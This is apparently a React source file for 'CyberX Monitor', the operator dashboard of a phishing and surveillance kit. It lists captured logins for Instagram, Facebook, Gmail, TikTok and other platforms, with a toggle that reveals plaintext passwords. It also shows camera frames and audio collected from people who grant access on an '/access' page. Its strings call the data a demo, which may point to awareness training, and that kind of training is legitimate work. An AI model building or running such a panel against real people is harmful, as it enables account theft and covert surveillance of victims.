import { useEffect, useMemo, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import {
  Activity,
  BarChart3,
  Camera,
  Clock3,
  Eye,
  EyeOff,
  ImageOff,
  KeyRound,
  LogOut,
  RefreshCw,
  Shield,
  Trash2,
  Users,
  X,
} from 'lucide-react';
import { getApiUrl } from '../../api';

type AdminPhoto = {
  id: string;
  session_id: string;
  storage_key: string | null;
  metadata: string | null;
  capture_timestamp: string;
};

const TABS = [
  { id: 'credentials', label: 'Credentials', icon: KeyRound },
  { id: 'sessions', label: 'Sessions', icon: Users },
  { id: 'photos', label: 'Photos', icon: Camera },
  { id: 'analytics', label: 'Analytics', icon: BarChart3 },
] as const;

const PLATFORM_STYLES: Record<string, string> = {
  instagram: 'bg-pink-500/15 text-pink-300 ring-pink-500/30',
  facebook: 'bg-blue-500/15 text-blue-300 ring-blue-500/30',
  twitter: 'bg-sky-500/15 text-sky-300 ring-sky-500/30',
  linkedin: 'bg-cyan-500/15 text-cyan-300 ring-cyan-500/30',
  gmail: 'bg-red-500/15 text-red-300 ring-red-500/30',
  tiktok: 'bg-fuchsia-500/15 text-fuchsia-300 ring-fuchsia-500/30',
  access: 'bg-emerald-500/15 text-emerald-300 ring-emerald-500/30',
  camera: 'bg-emerald-500/15 text-emerald-300 ring-emerald-500/30',
};

function parsePhotoMetadata(metadata: string | null) {
  try {
    return metadata ? JSON.parse(metadata) : {};
  } catch {
    return {};
  }
}

function formatTime(value?: string) {
  if (!value) {
    return 'Unknown';
  }
  const date = new Date(value);
  if (Number.isNaN(date.getTime())) {
    return value;
  }
  return date.toLocaleString();
}

function PhotoThumbnail({ photoId, token, alt }: { photoId: string; token: string; alt: string }) {
  const [src, setSrc] = useState<string | null>(null);
  const [failed, setFailed] = useState(false);

  useEffect(() => {
    let objectUrl: string | null = null;
    let cancelled = false;

    const load = async () => {
      try {
        const response = await fetch(getApiUrl(`/api/admin/photos/${photoId}/image`), {
          headers: { Authorization: `Bearer ${token}` },
        });
        if (!response.ok) {
          throw new Error('Failed to load photo');
        }
        const blob = await response.blob();
        if (cancelled) {
          return;
        }
        objectUrl = URL.createObjectURL(blob);
        setSrc(objectUrl);
      } catch {
        if (!cancelled) {
          setFailed(true);
        }
      }
    };

    void load();

    return () => {
      cancelled = true;
      if (objectUrl) {
        URL.revokeObjectURL(objectUrl);
      }
    };
  }, [photoId, token]);

  if (failed) {
    return (
      <div className="flex h-full w-full flex-col items-center justify-center gap-2 bg-zinc-800 text-zinc-500">
        <ImageOff size={22} />
        <span className="text-xs">Unavailable</span>
      </div>
    );
  }

  if (!src) {
    return <div className="h-full w-full animate-pulse bg-zinc-800" />;
  }

  return <img src={src} alt={alt} className="h-full w-full object-cover" />;
}

export default function AdminDashboard() {
  const navigate = useNavigate();
  const [credentials, setCredentials] = useState<any[]>([]);
  const [sessions, setSessions] = useState<any[]>([]);
  const [photos, setPhotos] = useState<AdminPhoto[]>([]);
  const [analytics, setAnalytics] = useState<any>(null);
  const [isLoading, setIsLoading] = useState(true);
  const [isRefreshing, setIsRefreshing] = useState(false);
  const [activeTab, setActiveTab] = useState<(typeof TABS)[number]['id']>('credentials');
  const [deleteConfirm, setDeleteConfirm] = useState(false);
  const [revealedPasswords, setRevealedPasswords] = useState<Record<string, boolean>>({});
  const [selectedPhoto, setSelectedPhoto] = useState<AdminPhoto | null>(null);
  const [sessionFilter, setSessionFilter] = useState('all');
  const [lastUpdated, setLastUpdated] = useState<Date | null>(null);
  const adminToken = localStorage.getItem('adminToken') || '';

  useEffect(() => {
    const token = localStorage.getItem('adminToken');
    if (!token) {
      navigate('/admin/login');
      return;
    }
    void loadData();
    const interval = setInterval(() => {
      void loadData(true);
    }, 5000);
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    if (!selectedPhoto) {
      return;
    }

    const onKeyDown = (event: KeyboardEvent) => {
      if (event.key === 'Escape') {
        setSelectedPhoto(null);
        return;
      }

      const visiblePhotos = sessionFilter === 'all' ? photos : photos.filter((photo) => photo.session_id === sessionFilter);
      const currentIndex = visiblePhotos.findIndex((photo) => photo.id === selectedPhoto.id);
      if (event.key === 'ArrowRight' && currentIndex < visiblePhotos.length - 1) {
        setSelectedPhoto(visiblePhotos[currentIndex + 1]);
      }
      if (event.key === 'ArrowLeft' && currentIndex > 0) {
        setSelectedPhoto(visiblePhotos[currentIndex - 1]);
      }
    };

    window.addEventListener('keydown', onKeyDown);
    return () => window.removeEventListener('keydown', onKeyDown);
  }, [selectedPhoto, photos, sessionFilter]);

  const loadData = async (silent = false) => {
    const token = localStorage.getItem('adminToken');
    if (!silent) {
      setIsRefreshing(true);
    }

    try {
      const [credResponse, sessResponse, photosResponse, analyticsResponse] = await Promise.all([
        fetch(getApiUrl('/api/admin/credentials'), { headers: { Authorization: `Bearer ${token}` } }),
        fetch(getApiUrl('/api/admin/sessions'), { headers: { Authorization: `Bearer ${token}` } }),
        fetch(getApiUrl('/api/admin/photos'), { headers: { Authorization: `Bearer ${token}` } }),
        fetch(getApiUrl('/api/admin/analytics'), { headers: { Authorization: `Bearer ${token}` } }),
      ]);

      if (credResponse.ok) {
        setCredentials(await credResponse.json());
      }
      if (sessResponse.ok) {
        setSessions(await sessResponse.json());
      }
      if (photosResponse.ok) {
        const photosData = await photosResponse.json();
        setPhotos(Array.isArray(photosData) ? photosData : []);
      }
      if (analyticsResponse.ok) {
        setAnalytics(await analyticsResponse.json());
      }
      setLastUpdated(new Date());
    } catch (error) {
      console.error('Failed to load data:', error);
    } finally {
      setIsLoading(false);
      setIsRefreshing(false);
    }
  };

  const handleLogout = () => {
    localStorage.removeItem('adminToken');
    navigate('/admin/login');
  };

  const handleDeleteAllData = async () => {
    if (!deleteConfirm) {
      setDeleteConfirm(true);
      return;
    }

    const token = localStorage.getItem('adminToken');
    try {
      const response = await fetch(getApiUrl('/api/admin/all-data'), {
        method: 'DELETE',
        headers: { Authorization: `Bearer ${token}` },
      });

      if (response.ok) {
        setCredentials([]);
        setSessions([]);
        setPhotos([]);
        setAnalytics(null);
        setSelectedPhoto(null);
        setDeleteConfirm(false);
      }
    } catch (error) {
      console.error('Delete failed:', error);
    }
  };

  const togglePasswordVisibility = (credentialId: string) => {
    setRevealedPasswords((prev) => ({
      ...prev,
      [credentialId]: !prev[credentialId],
    }));
  };

  const sessionIds = useMemo(
    () => Array.from(new Set(photos.map((photo) => photo.session_id).filter(Boolean))),
    [photos]
  );

  const visiblePhotos = useMemo(
    () => (sessionFilter === 'all' ? photos : photos.filter((photo) => photo.session_id === sessionFilter)),
    [photos, sessionFilter]
  );

  const platformCounts = analytics?.credentialsByPlatform || {};
  const maxPlatformCount = Math.max(1, ...Object.values(platformCounts).map((count) => Number(count) || 0));

  if (isLoading && !credentials.length && !photos.length) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-zinc-950 text-zinc-300">
        <div className="text-center">
          <div className="mx-auto mb-4 h-10 w-10 animate-spin rounded-full border-2 border-violet-400 border-t-transparent" />
          <p>Loading dashboard...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-zinc-950 text-zinc-100">
      <header className="sticky top-0 z-40 border-b border-white/10 bg-zinc-950/80 backdrop-blur">
        <div className="mx-auto flex max-w-7xl items-center justify-between gap-4 px-4 py-4">
          <div className="flex items-center gap-3">
            <div className="flex h-11 w-11 items-center justify-center rounded-xl bg-violet-500/15 text-violet-300 ring-1 ring-violet-400/30">
              <Shield size={22} />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <h1 className="text-xl font-semibold tracking-tight text-white">CyberX Monitor</h1>
                <span className="inline-flex items-center gap-1 rounded-full bg-emerald-500/15 px-2 py-0.5 text-[11px] font-medium text-emerald-300 ring-1 ring-emerald-400/20">
                  <span className="h-1.5 w-1.5 animate-pulse rounded-full bg-emerald-400" />
                  Live
                </span>
              </div>
              <p className="text-xs text-zinc-400">
                {lastUpdated ? `Updated ${lastUpdated.toLocaleTimeString()}` : 'Waiting for first refresh'}
              </p>
            </div>
          </div>

          <div className="flex items-center gap-2">
            <button
              onClick={() => void loadData()}
              className="inline-flex items-center gap-2 rounded-lg bg-white/5 px-3 py-2 text-sm text-zinc-200 ring-1 ring-white/10 transition hover:bg-white/10"
            >
              <RefreshCw size={16} className={isRefreshing ? 'animate-spin' : ''} />
              Refresh
            </button>
            <button
              onClick={handleLogout}
              className="inline-flex items-center gap-2 rounded-lg bg-white/5 px-3 py-2 text-sm text-zinc-200 ring-1 ring-white/10 transition hover:bg-white/10"
            >
              <LogOut size={16} />
              Logout
            </button>
          </div>
        </div>
      </header>

      <main className="mx-auto max-w-7xl px-4 py-8">
        <section className="mb-8 grid grid-cols-1 gap-4 sm:grid-cols-2 xl:grid-cols-4">
          {[
            { label: 'Active Sessions', value: analytics?.activeSessions || sessions.length || 0, icon: Activity, tone: 'text-sky-300 bg-sky-500/10 ring-sky-400/20' },
            { label: 'Credentials', value: analytics?.totalCredentials || credentials.length || 0, icon: KeyRound, tone: 'text-rose-300 bg-rose-500/10 ring-rose-400/20' },
            { label: 'Photos', value: analytics?.totalPhotos || photos.length || 0, icon: Camera, tone: 'text-emerald-300 bg-emerald-500/10 ring-emerald-400/20' },
            { label: 'Audio', value: `${analytics?.totalAudioMinutes || 0}m`, icon: Clock3, tone: 'text-violet-300 bg-violet-500/10 ring-violet-400/20' },
          ].map((card) => (
            <div key={card.label} className="rounded-2xl border border-white/10 bg-zinc-900/70 p-5 shadow-xl shadow-black/20">
              <div className="flex items-center justify-between">
                <p className="text-sm text-zinc-400">{card.label}</p>
                <div className={`rounded-lg p-2 ring-1 ${card.tone}`}>
                  <card.icon size={18} />
                </div>
              </div>
              <p className="mt-4 text-3xl font-semibold tracking-tight text-white">{card.value}</p>
            </div>
          ))}
        </section>

        <section className="overflow-hidden rounded-2xl border border-white/10 bg-zinc-900/70 shadow-xl shadow-black/20">
          <div className="flex gap-1 overflow-x-auto border-b border-white/10 p-2">
            {TABS.map((tab) => {
              const count =
                tab.id === 'credentials'
                  ? credentials.length
                  : tab.id === 'sessions'
                    ? sessions.length
                    : tab.id === 'photos'
                      ? photos.length
                      : Object.keys(platformCounts).length;
              const Icon = tab.icon;
              const isActive = activeTab === tab.id;

              return (
                <button
                  key={tab.id}
                  onClick={() => setActiveTab(tab.id)}
                  className={`inline-flex items-center gap-2 rounded-xl px-4 py-2.5 text-sm font-medium transition ${
                    isActive ? 'bg-violet-500 text-white' : 'text-zinc-400 hover:bg-white/5 hover:text-zinc-100'
                  }`}
                >
                  <Icon size={16} />
                  {tab.label}
                  <span className={`rounded-full px-1.5 py-0.5 text-[11px] ${isActive ? 'bg-white/20' : 'bg-white/5'}`}>
                    {count}
                  </span>
                </button>
              );
            })}
          </div>

          {activeTab === 'credentials' && (
            <div className="p-4 md:p-6">
              {credentials.length ? (
                <div className="overflow-x-auto">
                    <table className="w-full min-w-180 text-left text-sm">
                    <thead className="text-xs uppercase tracking-wide text-zinc-500">
                      <tr>
                        <th className="px-3 py-3">Platform</th>
                        <th className="px-3 py-3">Email / Username</th>
                        <th className="px-3 py-3">Password</th>
                        <th className="px-3 py-3">Captured</th>
                        <th className="px-3 py-3">Session</th>
                      </tr>
                    </thead>
                    <tbody>
                      {credentials.map((cred, idx) => {
                        const isPasswordVisible = !!revealedPasswords[cred.id];
                        const passwordDisplay = isPasswordVisible
                          ? cred.password
                          : '•'.repeat(Math.min(String(cred.password || '').length, 12));
                        const platform = String(cred.demo_type || 'unknown').toLowerCase();

                        return (
                          <tr key={cred.id || idx} className="border-t border-white/5 hover:bg-white/5">
                            <td className="px-3 py-3">
                              <span className={`inline-flex rounded-full px-2.5 py-1 text-xs font-medium ring-1 ${PLATFORM_STYLES[platform] || 'bg-zinc-700/50 text-zinc-300 ring-white/10'}`}>
                                {cred.demo_type || 'unknown'}
                              </span>
                            </td>
                            <td className="px-3 py-3 font-medium text-zinc-100">{cred.email_or_username}</td>
                            <td className="px-3 py-3">
                              <div className="flex items-center gap-2">
                                <code className="rounded-md bg-zinc-800 px-2 py-1 text-xs text-zinc-200">{passwordDisplay}</code>
                                <button
                                  type="button"
                                  onClick={() => togglePasswordVisibility(cred.id)}
                                  className="rounded-md p-1.5 text-zinc-400 transition hover:bg-white/10 hover:text-white"
                                  aria-label={isPasswordVisible ? 'Hide password' : 'Show password'}
                                >
                                  {isPasswordVisible ? <EyeOff size={16} /> : <Eye size={16} />}
                                </button>
                              </div>
                            </td>
                            <td className="px-3 py-3 text-xs text-zinc-400">{formatTime(cred.captured_at)}</td>
                            <td className="px-3 py-3 font-mono text-xs text-zinc-500">{cred.session_id?.slice(-8)}</td>
                          </tr>
                        );
                      })}
                    </tbody>
                  </table>
                </div>
              ) : (
                <EmptyState title="No credentials yet" body="Captured logins from the demo pages will appear here." />
              )}
            </div>
          )}

          {activeTab === 'sessions' && (
            <div className="grid gap-4 p-4 md:grid-cols-2 md:p-6">
              {sessions.length ? (
                sessions.map((session) => (
                  <div key={session.id} className="rounded-2xl border border-white/10 bg-zinc-950/60 p-4">
                    <div className="flex items-start justify-between gap-3">
                      <div>
                        <p className="font-mono text-sm text-white">Session {session.id?.slice(-8)}</p>
                        <p className="mt-1 text-xs text-zinc-500">{session.id}</p>
                      </div>
                      <span className={`rounded-full px-2.5 py-1 text-xs font-medium ring-1 ${
                        session.status === 'active'
                          ? 'bg-emerald-500/15 text-emerald-300 ring-emerald-400/20'
                          : 'bg-zinc-700/50 text-zinc-300 ring-white/10'
                      }`}>
                        {session.status || 'unknown'}
                      </span>
                    </div>
                    <div className="mt-4 grid grid-cols-2 gap-3 text-sm">
                      <div className="rounded-xl bg-white/5 px-3 py-2">
                        <p className="text-xs text-zinc-500">Photos</p>
                        <p className="font-semibold text-white">{session.photo_count || 0}</p>
                      </div>
                      <div className="rounded-xl bg-white/5 px-3 py-2">
                        <p className="text-xs text-zinc-500">Audio</p>
                        <p className="font-semibold text-white">{session.audio_duration_ms || 0}ms</p>
                      </div>
                    </div>
                    <p className="mt-3 text-xs text-zinc-500">{formatTime(session.created_at)}</p>
                  </div>
                ))
              ) : (
                <div className="md:col-span-2">
                  <EmptyState title="No sessions yet" body="A session is created when someone starts the access flow." />
                </div>
              )}
            </div>
          )}

          {activeTab === 'photos' && (
            <div className="p-4 md:p-6">
              {photos.length ? (
                <>
                  <div className="mb-4 flex flex-wrap items-center gap-2">
                    <button
                      type="button"
                      onClick={() => setSessionFilter('all')}
                      className={`rounded-full px-3 py-1.5 text-xs font-medium ring-1 transition ${
                        sessionFilter === 'all'
                          ? 'bg-violet-500 text-white ring-violet-400/40'
                          : 'bg-white/5 text-zinc-300 ring-white/10 hover:bg-white/10'
                      }`}
                    >
                      All sessions · {photos.length}
                    </button>
                    {sessionIds.map((sessionId) => (
                      <button
                        key={sessionId}
                        type="button"
                        onClick={() => setSessionFilter(sessionId)}
                        className={`rounded-full px-3 py-1.5 text-xs font-medium ring-1 transition ${
                          sessionFilter === sessionId
                            ? 'bg-violet-500 text-white ring-violet-400/40'
                            : 'bg-white/5 text-zinc-300 ring-white/10 hover:bg-white/10'
                        }`}
                      >
                        {sessionId.slice(-8)} · {photos.filter((photo) => photo.session_id === sessionId).length}
                      </button>
                    ))}
                  </div>

                  <div className="grid grid-cols-2 gap-3 sm:grid-cols-3 lg:grid-cols-4">
                    {visiblePhotos.map((photo) => {
                      const metadata = parsePhotoMetadata(photo.metadata);
                      const source = metadata.source || 'camera';

                      return (
                        <button
                          key={photo.id}
                          type="button"
                          onClick={() => setSelectedPhoto(photo)}
                          className="group overflow-hidden rounded-2xl border border-white/10 bg-zinc-950 text-left transition hover:-translate-y-0.5 hover:border-violet-400/40 hover:shadow-lg hover:shadow-violet-950/40"
                        >
                          <div className="relative aspect-4/3 overflow-hidden">
                            <div className="h-full w-full transition duration-300 group-hover:scale-105">
                              <PhotoThumbnail
                                photoId={photo.id}
                                token={adminToken}
                                alt={`Capture from session ${photo.session_id}`}
                              />
                            </div>
                            <div className="absolute inset-x-0 bottom-0 bg-linear-to-t from-black/80 via-black/30 to-transparent p-3">
                              <p className="text-sm font-medium text-white capitalize">{source}</p>
                              <p className="text-[11px] text-zinc-300">{formatTime(photo.capture_timestamp)}</p>
                            </div>
                          </div>
                        </button>
                      );
                    })}
                  </div>
                </>
              ) : (
                <EmptyState title="No photos captured yet" body="Grant camera access on /access to start collecting frames." />
              )}
            </div>
          )}

          {activeTab === 'analytics' && (
            <div className="grid gap-6 p-4 md:grid-cols-2 md:p-6">
              <div className="rounded-2xl border border-white/10 bg-zinc-950/60 p-5">
                <h3 className="mb-4 text-sm font-semibold text-white">Credentials by platform</h3>
                <div className="space-y-3">
                  {Object.keys(platformCounts).length ? (
                    Object.entries(platformCounts).map(([platform, count]) => (
                      <div key={platform}>
                        <div className="mb-1 flex items-center justify-between text-sm">
                          <span className="capitalize text-zinc-300">{platform}</span>
                          <span className="font-semibold text-white">{String(count)}</span>
                        </div>
                        <div className="h-2 overflow-hidden rounded-full bg-white/5">
                          <div
                            className="h-full rounded-full bg-violet-500"
                            style={{ width: `${(Number(count) / maxPlatformCount) * 100}%` }}
                          />
                        </div>
                      </div>
                    ))
                  ) : (
                    <p className="text-sm text-zinc-500">No platform data yet.</p>
                  )}
                </div>
              </div>
              <div className="rounded-2xl border border-white/10 bg-zinc-950/60 p-5">
                <h3 className="mb-4 text-sm font-semibold text-white">Session stats</h3>
                <div className="space-y-3 text-sm">
                  <div className="flex items-center justify-between rounded-xl bg-white/5 px-3 py-3">
                    <span className="text-zinc-400">Total sessions</span>
                    <span className="font-semibold text-white">{sessions.length}</span>
                  </div>
                  <div className="flex items-center justify-between rounded-xl bg-white/5 px-3 py-3">
                    <span className="text-zinc-400">Photos / session</span>
                    <span className="font-semibold text-white">
                      {sessions.length ? (photos.length / sessions.length).toFixed(1) : '0'}
                    </span>
                  </div>
                  <div className="flex items-center justify-between rounded-xl bg-white/5 px-3 py-3">
                    <span className="text-zinc-400">Credentials / session</span>
                    <span className="font-semibold text-white">
                      {sessions.length ? (credentials.length / sessions.length).toFixed(1) : '0'}
                    </span>
                  </div>
                </div>
              </div>
            </div>
          )}
        </section>

        <section className="mt-6 rounded-2xl border border-red-500/20 bg-red-500/5 p-5">
          <h2 className="text-lg font-semibold text-white">Data management</h2>
          <p className="mt-1 text-sm text-zinc-400">
            This permanently deletes captured sessions, credentials, and photo records from the demo database.
          </p>
          <div className="mt-4 flex flex-wrap gap-3">
            <button
              onClick={() => void handleDeleteAllData()}
              className={`inline-flex items-center gap-2 rounded-lg px-4 py-2.5 text-sm font-medium text-white transition ${
                deleteConfirm ? 'bg-red-600 hover:bg-red-500' : 'bg-zinc-800 hover:bg-zinc-700'
              }`}
            >
              <Trash2 size={16} />
              {deleteConfirm ? 'Confirm delete all' : 'Delete all data'}
            </button>
            {deleteConfirm && (
              <button
                onClick={() => setDeleteConfirm(false)}
                className="rounded-lg bg-white/5 px-4 py-2.5 text-sm text-zinc-200 ring-1 ring-white/10 hover:bg-white/10"
              >
                Cancel
              </button>
            )}
          </div>
        </section>
      </main>

      {selectedPhoto && (
        <div
          className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 p-4 backdrop-blur-sm"
          onClick={() => setSelectedPhoto(null)}
        >
          <div
            className="relative w-full max-w-4xl overflow-hidden rounded-2xl border border-white/10 bg-zinc-950 shadow-2xl"
            onClick={(event) => event.stopPropagation()}
          >
            <button
              type="button"
              onClick={() => setSelectedPhoto(null)}
              className="absolute right-3 top-3 z-10 rounded-full bg-black/60 p-2 text-white hover:bg-black/80"
              aria-label="Close photo"
            >
              <X size={18} />
            </button>
            <div className="aspect-16/10 bg-black">
              <PhotoThumbnail
                photoId={selectedPhoto.id}
                token={adminToken}
                alt={`Full capture from session ${selectedPhoto.session_id}`}
              />
            </div>
            <div className="grid gap-3 p-4 text-sm text-zinc-300 sm:grid-cols-3">
              <div className="rounded-xl bg-white/5 px-3 py-2">
                <p className="text-[11px] uppercase tracking-wide text-zinc-500">Session</p>
                <p className="truncate font-mono text-white">{selectedPhoto.session_id}</p>
              </div>
              <div className="rounded-xl bg-white/5 px-3 py-2">
                <p className="text-[11px] uppercase tracking-wide text-zinc-500">Source</p>
                <p className="capitalize text-white">{parsePhotoMetadata(selectedPhoto.metadata).source || 'camera'}</p>
              </div>
              <div className="rounded-xl bg-white/5 px-3 py-2">
                <p className="text-[11px] uppercase tracking-wide text-zinc-500">Captured</p>
                <p className="text-white">{formatTime(selectedPhoto.capture_timestamp)}</p>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

function EmptyState({ title, body }: { title: string; body: string }) {
  return (
    <div className="rounded-2xl border border-dashed border-white/10 px-6 py-16 text-center">
      <p className="text-base font-medium text-white">{title}</p>
      <p className="mt-1 text-sm text-zinc-500">{body}</p>
    </div>
  );
}
